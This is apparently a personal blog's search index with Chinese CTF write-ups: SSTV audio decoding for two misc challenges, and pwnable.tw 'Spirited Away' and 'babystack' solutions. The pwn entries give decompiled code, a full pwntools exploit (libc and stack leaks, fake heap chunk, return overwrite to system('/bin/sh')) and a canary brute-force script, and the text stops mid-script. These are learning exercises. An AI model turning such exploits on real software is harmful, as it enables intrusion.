<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>从一道Misc到学习百万混音</title>
      <link href="/2020/07/09/%E4%BB%8E%E4%B8%80%E9%81%93Misc%E5%88%B0%E5%AD%A6%E4%B9%A0%E7%99%BE%E4%B8%87%E6%B7%B7%E9%9F%B3/"/>
      <url>/2020/07/09/%E4%BB%8E%E4%B8%80%E9%81%93Misc%E5%88%B0%E5%AD%A6%E4%B9%A0%E7%99%BE%E4%B8%87%E6%B7%B7%E9%9F%B3/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末打了下STCF，有一道wav的misc，尝试了wav隐写的各种方法都失败了，今天看了下wp，学到了一种叫sstv（慢扫描电视）的东西。</p><h3 id="sstv"><a href="#sstv" class="headerlink" title="sstv"></a>sstv</h3><p><strong>慢扫描电视（Slow-scan television）是<a href="https://baike.baidu.com/item/%E4%B8%9A%E4%BD%99%E6%97%A0%E7%BA%BF%E7%94%B5" target="_blank" rel="noopener">业余无线电</a>爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。    </strong></p><p>简单点说，就是图片在发送的时候调制成一种哔哔的声音，接收的时候再将这种声音解调成图片。因此需要用到sstv相关的软件</p><p>PC：<a href="https://hamsoft.ca/pages/mmsstv.php" target="_blank" rel="noopener">MMSSTV</a></p><p>android: robot36(好像只能接收不能发送)</p><p>有了两台设备，我们就可进行图片传输了，例如：从PC传一张“神奈川冲浪里”到手机上</p><p><img alt="" data-src="/2020/07/09/从一道Misc到学习百万混音/1.png" class="lazyload"></p><p>可以看到图片成功传送，但是会受周围环境的影响，因此有一定的失真。</p><h3 id="SCTF2020-can-you-hear-me"><a href="#SCTF2020-can-you-hear-me" class="headerlink" title="SCTF2020 can you hear me"></a>SCTF2020 can you hear me</h3><p>貌似有点扯远了，我们回到这道misc上来。题目文件是一段哔哔的音频，我们直接利用MMSSTV或者robot36进行接收，便可以得到flag</p><p><img alt="" data-src="/2020/07/09/从一道Misc到学习百万混音/2.png" class="lazyload"></p><h3 id="2018-QCTF-Noise"><a href="#2018-QCTF-Noise" class="headerlink" title="2018 QCTF Noise"></a>2018 QCTF Noise</h3><p>好像有点简单，且上述内容与百万混音都没啥关系，但是当我在搜索类似题目的时候，发现了这道题。题目源文件是一段音乐，具体参考<a href="https://blog.csdn.net/u011297466/article/details/81059248" target="_blank" rel="noopener">wp</a></p><p>这里有意思的是需要利用干涉消音提取出sstv的信号，这里就要用到AU进行消音，于是顺势学习了一波AU。</p><p>1、打开AU，新建多轨工程，导入源文件和从网易云下载的原曲《My Little Pony Theme Song》</p><p><img alt="" data-src="/2020/07/09/从一道Misc到学习百万混音/3.PNG" class="lazyload"></p><p>可以看到两段音轨非常相似</p><p>2、将原曲进行反相</p><p><img alt="" data-src="/2020/07/09/从一道Misc到学习百万混音/4.PNG" class="lazyload"></p><p>3、播放，robot36接收</p><p><img alt="" data-src="/2020/07/09/从一道Misc到学习百万混音/5.png" class="lazyload"></p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>顺势学习了一波AU，刚好刚买的音箱也快到了，到时候可以借着连绵阴雨，抚琴一曲，再加上百万混音，岂不美哉！</p><p>​                                                              </p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwnable.tw Spirited Away</title>
      <link href="/2020/06/23/pwnable-tw-Spirited-Away/"/>
      <url>/2020/06/23/pwnable-tw-Spirited-Away/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这道题是栈溢出与堆溢出的结合，利用sprintf函数进行溢出。</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  spirit-away checksec ./spirited_away</span><br><span class="line">[*] &apos;/mnt/hgfs/shared/tw/spirit-away/spirited_away&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位程序，只开启了NX</p><h4 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h4><p>survay函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">survey</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [esp+10h] [ebp-E8h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+48h] [ebp-B0h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [esp+4Ch] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+50h] [ebp-A8h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+A0h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [esp+A4h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+A8h] [ebp-50h]</span></span><br><span class="line"></span><br><span class="line">  nbytes = <span class="number">0x3C</span>;</span><br><span class="line">  v3 = <span class="number">0x50</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nPlease enter your name: "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your age: "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Why did you came to see this movie? "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v7, v3);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your comment: "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, nbytes);</span><br><span class="line">  ++cnt;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Age: %d\n"</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Reason: %s\n"</span>, &amp;v7);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;v1);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">if</span> ( cnt &gt; <span class="number">199</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"200 comments is enough!"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;choice, <span class="number">3u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="string">'Y'</span> || choice == <span class="string">'y'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(buf);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="string">'N'</span> || choice == <span class="string">'n'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong choice."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现实现的是一个留言板的功能，该程序存在两个漏洞：</p><ol><li>利用read函数可以泄露出栈中的地址，其中包括libc和栈地址</li><li>sprintf函数存在单字节溢出</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当cnt为三位数，例如100时</span><br><span class="line">&gt;&gt;&gt; len(&quot;100 comment so far. We will review them as soon as we can&quot;)                 </span><br><span class="line">57</span><br><span class="line"></span><br><span class="line">这时最后一个字节n会覆盖掉nbytes，这时nbyte==0x6e，在read buf和&amp;s时都会产生溢出</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>泄露libc和栈地址，并计算出system和“/bin/sh”的地址</li><li>在栈上布置好fake_chunk,利用&amp;s的溢出覆盖buf的值为fake_chunk地址并进行free</li><li>利用buf（现在为栈地址）的溢出覆盖掉返回值</li></ol><p>完整脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./spirited_away"</span>)</span><br><span class="line"><span class="comment"># p = remote("chall.pwnable.tw", 10204)</span></span><br><span class="line">elf = ELF(<span class="string">"./spirited_away"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc_32.so.6")</span></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line">r = <span class="keyword">lambda</span> : p.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x0804a084'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span><span class="params">(name,reason,comment)</span>:</span></span><br><span class="line">    sa(<span class="string">'Please enter your name: '</span>, name)</span><br><span class="line">    sa(<span class="string">'Please enter your age: '</span>, <span class="string">'1\n'</span>)</span><br><span class="line">    sa(<span class="string">'Why did you came to see this movie? '</span>, reason)</span><br><span class="line">    sa(<span class="string">'Please enter your comment: '</span>, comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">andone</span><span class="params">()</span>:</span></span><br><span class="line">    sa(<span class="string">'Would you like to leave another comment? &lt;y/n&gt;: '</span>, <span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overflow to nbytes</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    leave(<span class="string">'kangel\0'</span>,<span class="string">'a\0'</span>,<span class="string">'b\0'</span>)</span><br><span class="line">    andone()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">    sa(<span class="string">'Please enter your age: '</span>, <span class="string">'1\n'</span>)</span><br><span class="line">    sa(<span class="string">'Why did you came to see this movie? '</span>, <span class="string">'c\x00'</span>)</span><br><span class="line">    sa(<span class="string">'Would you like to leave another comment? &lt;y/n&gt;: '</span>, <span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">leave(<span class="string">'kangel\0'</span>,<span class="string">'a'</span>*<span class="number">0x14</span>+<span class="string">'bbbb'</span>,<span class="string">'123'</span>)</span><br><span class="line">ru(<span class="string">"bbbb"</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">7</span> - libc.sym[<span class="string">'_IO_file_sync'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">andone()</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak stack</span></span><br><span class="line">leave(<span class="string">'kangel\0'</span>,<span class="string">'a'</span>*<span class="number">0x34</span>+<span class="string">'bbbb'</span>,<span class="string">'123'</span>)</span><br><span class="line">ru(<span class="string">"bbbb"</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x70</span></span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line">andone()</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_chunk</span></span><br><span class="line">reason = p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + <span class="string">'a'</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">comment = <span class="string">'a'</span>*<span class="number">0x54</span> + p32(stack+<span class="number">8</span>)</span><br><span class="line">leave(<span class="string">'kangel\0'</span>,reason,comment)</span><br><span class="line">andone()</span><br><span class="line"></span><br><span class="line"><span class="comment">#heap overflow</span></span><br><span class="line">name = <span class="string">'a'</span>*<span class="number">0x4c</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class="line">leave(name,<span class="string">'a\0'</span>,<span class="string">'b\0'</span>)</span><br><span class="line"><span class="comment"># gd()</span></span><br><span class="line">sa(<span class="string">'Would you like to leave another comment? &lt;y/n&gt;: '</span>, <span class="string">'n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.tw </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwnable.tw babystack</title>
      <link href="/2020/06/22/pwnable-tw-babystack/"/>
      <url>/2020/06/22/pwnable-tw-babystack/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是一道组合溢出的题目，与常见的栈溢出不同，故记录一下。</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><h4 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  babystack checksec ./babystack</span><br><span class="line">[*] &apos;/mnt/hgfs/shared/tw/babystack/babystack&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>保护全开，既然是栈溢出，那么泄露canary是必不可少的。</p><h4 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h4><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  sub_D30();</span><br><span class="line">  dword_202018[<span class="number">0</span>] = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  read(dword_202018[<span class="number">0</span>], &amp;buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  v3 = qword_202020;</span><br><span class="line">  v4 = v8;</span><br><span class="line">  *(_QWORD *)qword_202020 = buf;</span><br><span class="line">  v3[<span class="number">1</span>] = v4;</span><br><span class="line">  close(dword_202018[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"&gt;&gt; "</span>, <span class="number">3u</span>LL);</span><br><span class="line">    _read_chk(<span class="number">0L</span>L, (__int64)&amp;v9, <span class="number">16L</span>L, <span class="number">16L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v9 == <span class="string">'2'</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9 == <span class="string">'3'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( is_login )</span><br><span class="line">        copy(&amp;v6);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == <span class="string">'1'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( is_login )</span><br><span class="line">        is_login = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        login((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !is_login )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;buf, qword_202020, <span class="number">0x10</span>uLL) )</span><br><span class="line">    JUMPOUT(loc_100B);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先读取16字节的随机数到栈上，并赋值给bss段上qword_202020。接着进入while循环，函数结束时会判断buf和qword_202020的值。可以发现这里的canary保护和常规的有点不同，因此需要泄露buf的值。</p><p>下面进入循环：</p><p>login函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">login</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your passowrd :"</span>);</span><br><span class="line">  sub_CA0((<span class="keyword">unsigned</span> __int8 *)&amp;s, <span class="number">0x7F</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s, a1, v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Failed !"</span>);</span><br><span class="line">  is_login = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login Success !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当is_login==0时会进入login函数，这里首先读取数据到栈上，然后和buf的值进行strncmp判断。这里有两种绕过方法：</p><p>1、利用‘\x00’进行截断，因为strlen碰上’\x00’ 和’\x0a’会产生阶段，因此可以直接绕过strncmp的判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login(<span class="string">'\x00'</span>+<span class="string">'a'</span>*<span class="number">0x57</span>)</span><br></pre></td></tr></table></figure><p>2、逐字节进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bf</span><span class="params">(length,s1 = <span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">10</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s2 = s1 + chr(i)</span><br><span class="line">            login(s2+<span class="string">'\x00'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Success"</span> <span class="keyword">in</span> p.recv():</span><br><span class="line">                s1 = s2</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+]found!"</span></span><br><span class="line">                logout()</span><br><span class="line">                sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(s2) == length:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> s1</span><br></pre></td></tr></table></figure><p>copy函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">copy</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Copy :"</span>);</span><br><span class="line">  sub_CA0((<span class="keyword">unsigned</span> __int8 *)&amp;src, <span class="number">0x3F</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(a1, &amp;src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"It is magic copy !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当is_login==1时，该函数会将当前栈上读入的数据strcpy到main函数的栈上。</p><p><strong>这里的漏洞点在于copy函数和login函数的栈空间相同，而login函数可以读入0x7f个字节，这在copy到main函数栈上时将会产生溢出。</strong></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>1、利用strncmp爆破出canary的值</p><p>2、利用copy函数布置好栈空间，利用strncmpbaopo出libc的地址</p><p>3、因为strcpy会有’\x00’阶段，因此无法使用ROP，需要计算出one_gadget一发入魂</p><p>4、利用copy函数进行溢出并将返回地址覆盖成one_gadget</p><p>完整脚本如下：</p><figure class="highlight python"><table><tr><td 